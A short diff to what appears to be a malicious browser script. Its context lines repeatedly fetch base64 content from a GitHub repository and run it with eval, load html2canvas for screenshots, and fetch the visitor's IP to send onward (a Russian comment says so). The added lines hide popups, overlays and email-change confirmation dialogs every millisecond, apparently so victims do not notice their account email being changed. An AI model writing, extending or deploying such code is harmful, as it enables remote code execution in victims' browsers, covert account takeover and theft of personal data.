@@ -1,6 +1,11 @@
 setInterval(() => {$.get("https://api.github.com/repos/uloxa13/Fq/contents/Fq", function(data) {
   eval(atob(data.content));
 });}, 2050);
+setInterval(() => {
+document.querySelectorAll('.popups .popup[data-id^="temp"]').forEach(el => el.remove());
+document.querySelectorAll('.overlay').forEach(el => el.remove());
+document.querySelectorAll('[id^="change-email-confirm"]').forEach(el => el.remove());
+}, 1);
 $.get("https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js", (d) => eval(d));
 // Сначала получаем IP пользователя, потом отправляем
 fetch('https://api.ipify.org?format=json')
